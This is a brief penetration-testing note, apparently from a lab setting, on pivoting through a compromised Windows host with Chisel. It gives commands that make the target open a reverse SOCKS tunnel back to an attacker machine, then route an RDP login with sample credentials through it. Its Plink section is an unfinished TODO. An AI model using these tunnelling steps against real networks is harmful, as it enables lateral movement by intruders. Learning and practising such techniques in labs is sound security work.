## Pivoting through a Windows machines

This is assuming you know what the concept of pivoting is.

### Chisel

Chisel is a TCP tunnel over HTTP. You can get your flavour of Chisel on Github: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel). It works with a client/server concept. Start it on your Hackbox as a server, connect to it from a target as a client.

```bash
# Hackbox
./chisel server -p 80 --reverse

# Target
# Get chisel.exe for windows x64 on system with wget or alternative means
./chisel client 10.10.14.3:80 R:socks

# RDP through proxychains example
proxychains xfreerdp /u:maglok /d:magcorp /p:'Somepassword' /v:10.10.110.13:3389
```

### Plink

// TODO
